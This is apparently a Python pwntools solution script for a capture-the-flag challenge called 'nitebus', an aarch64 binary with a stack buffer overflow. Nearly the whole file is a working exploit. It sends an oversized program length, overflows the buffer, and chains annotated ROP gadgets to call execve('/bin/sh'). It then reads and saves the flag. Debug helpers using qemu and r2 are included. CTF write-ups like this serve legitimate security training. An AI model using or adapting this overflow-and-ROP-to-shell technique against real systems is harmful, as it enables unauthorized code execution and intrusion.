#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./nitebus")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    if args.R2:
        debug_port = 1234
        qemu_cmd = ["qemu-aarch64", "-g", str(debug_port)] + [exe.path] + argv
        io = process(qemu_cmd, *a, **kw)
        time.sleep(1)

        r2_cmd = (
            f"r2 -c 'db 0x004008a4; dc; Vpp' -a arm -b 64 -e bin.cache=true "
            f"-d gdb://127.0.0.1:{debug_port} "
            f"-i {exe.path}"
        )
        
        final_cmd = f"{r2_cmd}; exec bash"
        
        log.info(f"Lancio: {final_cmd}")
        
        subprocess.Popen(
            [
            "x-terminal-emulator",
             "-e", 
             os.environ.get("SHELL", "/bin/sh"), 
             "-c", 
             final_cmd], 
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error("REMOTE mode selected but HOST or PORT is missing.")
            exit(1)

        log.info("Connecting to remote "+ str(host) + ":" + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
bof = 152
slave_address = b'\x01'
function_code = b'\x42'
program_size = 800

'''
The exploit is here is simple:
The server lets us input a program in a buffer of 125 bytes,
but does not check the input size sent, leading to a buffer overflow.
However, architecture is aarch64 and the gadgets are limited.
'''
poison_packet = flat([
    slave_address,
    function_code,
    program_size,
    ])
io.sendline(poison_packet)

bin_sh = next(exe.search(b'/bin/sh\x00'))
load_x0   = 0x0000000000445238 # ldr x0, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; 
load_x2   = 0x000000000041cf74 # ldr x2, [sp, #0x18]; ldp x29, x30, [sp], #0x20; mov x0, x2; ret; 
zero_x1   = 0x0000000000407c28 # mov x1, #0; blr x3; 
load_x3   = 0x0000000000436e08 # ldr x3, [sp, #0x10]; mov x0, x3; ldp x29, x30, [sp], #0x40; ret; 
mov_x6_x8 = 0x0000000000437850 # mov x8, x6; svc #0; ret; 
add_x6_x2 = 0x000000000040f494 # add x6, x6, x2; cmp x5, x6; b.eq 0xf4bc; mov w0, #0; ldp x29, x30, [sp], #0x30; ret;  


broken_program = flat({bof:[
    # 1. Loading x2 reg with a value to add to x6
    load_x2, 
    b'a'*32,    # stack padding
    0,          # offset 32 - >  load_x2 x29 content
    add_x6_x2,  # offset 40 - >  load_x2 x30 content
    0, 0x9d,    # offset 56 - >  load_x2 x2  content
    # x6 content is 0x40 in this frame
    
    # 2. add_x6_x2 will add x6 (0x40) + x2 (0x9d) forming
    # x6 = 0xdd, execve syscall. Then will check an
    # equality always false, not changing the rop flow

    # 3. Reuse x2 gadget to jump to x3 gadget
    0,          # add_x6_x2 x29 content
    load_x2,    # add_x6_x2 x30 content

    b'a'*32,    # stack padding
    0,          # offset 32 - > load_x2 x29 content
    load_x3,    # offset 40 - > load_x2 x30 content
    0, 0,       # offset 56 - > load_x2 x2  content

    # 4. Set x3 reg to use it as jmp register
    0,       # offset 0  - >  load_x3 x29 content
    zero_x1, # offset 8  - >  load_x3 x30 content
    load_x0, # offset 16 - >  load_x3 x3 content

    # 5. zero_x1 gadget will use the x3 reg as return
    # address (like jmp rax), returning to load_x0 gadget

    # load_x0 body here
    b'a'*40,   # stack padding 
    0,         # offset 48 - > load_x0 x29 content
    mov_x6_x8, # offset 56 - > load_x0 x30 content
    bin_sh,    # offset 64 - > load_x0 x0 content

    # 6. mov_x6_x8 will move syscall number from x6 to x8,
    # then call syscall
    ]})

io.sendlineafter(b'data: ', broken_program)
io.sendline(b"cat flag*")
data = io.recvregex(rb'nite\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
